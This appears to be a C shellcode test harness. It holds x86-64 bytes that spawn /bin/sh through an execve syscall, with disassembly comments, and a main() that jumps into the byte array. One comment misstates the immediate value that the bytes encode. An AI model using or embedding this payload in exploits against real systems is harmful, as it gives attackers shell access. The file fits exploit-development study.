#include <stdio.h>

const char shellcode[] =
        "\x48\x31\xc0"                               // xor    %rax,%rax
        "\x99"                                       // cltd
        "\xb0\x3b"                                   // mov    $0x3b,%al
        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
        "\x57"                                       // push   %rdi
        "\x48\x89\xe7"                               // mov    %rsp,%rdi
        "\x57"                                       // push   %rdi
        "\x52"                                       // push   %rdx
        "\x48\x89\xe6"                               // mov    %rsp,%rsi
        "\x0f\x05";                                  // syscall

int main(void)
{
        (*(void (*)()) shellcode)();
        return 0;
}

